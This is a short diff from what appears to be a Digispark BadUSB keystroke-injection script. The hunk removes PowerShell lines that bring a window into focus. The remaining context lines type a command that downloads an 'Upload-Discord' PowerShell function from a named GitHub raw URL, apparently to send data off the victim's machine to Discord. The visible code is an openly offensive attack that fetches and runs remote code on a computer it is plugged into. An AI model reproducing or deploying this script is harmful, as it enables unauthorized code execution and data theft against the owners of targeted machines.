@@ -31,14 +31,6 @@ void setup() {
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // hits enter
 
-  // brings focus to the PS window
-  // brings focus to the PS window
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println('[void] [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic")');
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("[Microsoft.VisualBasic.Interaction]::AppActivate((Get-Process -Name notepad).MainWindowTitle)");
-  DigiKeyboard.delay(1000);
-
   // downloads the Upload-Discord PS function from GitHub
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/Marquito0077/Team-Echo-Repo/main/Discord_Upload_PowerShell.ps1");
